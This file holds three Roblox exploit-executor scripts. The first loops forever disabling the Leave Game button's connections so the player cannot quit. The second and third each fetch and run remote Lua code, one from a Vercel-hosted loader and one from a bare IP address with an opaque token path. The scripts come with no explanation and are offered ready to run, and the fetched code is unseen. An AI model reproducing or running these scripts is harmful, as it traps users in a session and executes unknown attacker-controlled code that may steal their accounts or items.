-- Script 1
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- Script 2
task.spawn(function()
    loadstring(game:HttpGet("https://levi-hub-x.vercel.app/Loader.lua"))()
end)

-- Script 3
task.spawn(function()
    loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
end)
